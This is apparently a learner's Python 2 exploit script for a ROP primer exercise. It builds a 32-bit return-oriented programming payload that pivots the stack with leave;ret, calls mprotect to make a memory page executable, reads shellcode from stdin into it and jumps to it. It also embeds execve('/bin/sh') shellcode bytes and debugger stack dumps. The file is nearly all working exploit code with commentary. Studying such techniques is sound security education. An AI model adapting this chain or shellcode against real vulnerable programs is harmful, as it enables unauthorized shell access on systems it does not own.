#!/usr/bin/python

# following along here
# https://speakerd.s3.amazonaws.com/presentations/6486b353d27b45038d6b4286acbc9390/rop-primer.pdf

'''
tl;dr for ROP
for f in function_to_exec():
    push f() addr
    push pNret where n is len(f_argv)
    [ push f_argv[n] for n in f_argv ]

tricky part is getting the intial control of the stack with the leave; ret
and getting the shellcode into a place you can exec. I have a feeling
you won't be able to just read() from stdin every single time, or that
shellcode through read() might be too easy to detect and be obvious
'''

''' shellcode
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
'''

'''
You're going to need to change the addrs of the functions for the ROP chain
'''

import struct
def p(x):
    return struct.pack('<L', x)

payload = ""

''' do leave; ret to restore the stack to our payload
 if we don't do a leave; ret, the stack is still the legit stack
 of the program filled with
[------------------------------------stack-------------------------------------]
0000| 0xffffd4b0 --> 0x20000000 --> 0x0
0004| 0xffffd4b4 --> 0x400
0008| 0xffffd4b8 --> 0x1
0012| 0xffffd4bc --> 0x22 ('"')
0016| 0xffffd4c0 --> 0xffffffff
0020| 0xffffd4c4 --> 0x0
0024| 0xffffd4c8 --> 0xffffd58c --> 0xffffd713 ("XDG_VTNR=1")
0028| 0xffffd4cc --> 0xf7e4842d (<__cxa_atexit+29>:     test   eax,eax)

which won't be useful to us because we need to get args for the mprotect()
system call onto the stack

ebp helpfully points to the payload we have injected
we exec leave (mov esp, ebp; pop ebp)
which will put the payload into esp, then add esp,4
leaving us with ESP pointing to <mprotect> and our args to mprotect
on the stack

tl;dr the leave puts our payload on the stack. We now have full control
over the stack and where we are going with RET, so we can execute our
ROP chain to spawn a shell
'''
payload += p(0x80483e8) # leave; ret

'''
add 12 bytes of padding so when the leave is exec,
esp ends up pointing to the right place

before leave
EBP: 0xffffd4e8 ("AAAA\320\300\357\367]\205\004\b")
ESP: 0xffffd4ac --> 0x80484fc (<main+127>:      leave)

after leave
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd4ec --> 0xf7efc0d0 (<mprotect>:     push   ebx)

so this is something to be careful of when we need to
use leave to restore the stack, we need to ensure
we have the proper amount of padding for the leave instruction
'''
payload += "A"*12 # dummy

'''
At this point, we are in full control over the stack, so
we can make our own stack frames. Chain of execution looks like this:

ret; leave;
mprotect();
pppr();
read();
pppr();
shellcode() at 0x20000000;
'''
# make memory section rwx
# int mprotect(void *addr, size_t len, int prot);
payload += p(0xf7efc0d0) # mprotect(), function to call
payload += p(0x804855d) # pppr (pop3ret) -  func to ret to manually clean up our stack frame
payload += p(0x20000000) # mprotect argv[0] - addr to make executable
payload += p(0x1000) # mprotect argv [1] page-aligned size
payload += p(0x7) # mprotect argv [2] PROT|READ|PROT|WRITE|PROT_EXEC

# read shellcode into buffer
# ssize_t read(int fd, void *buf, size_t count);
payload += p(0xf7eefbd0) # read@plt, function to call
payload += p(0x804855d) # pppr - function to ret
payload += p(0x0) # fd = STDIN
payload += p(0x20000000) #buf
payload += p(0x200) # len

# return to buffer with shellcode, exec it
payload += p(0x20000000) # ret to first instruction of the shellcode

print payload
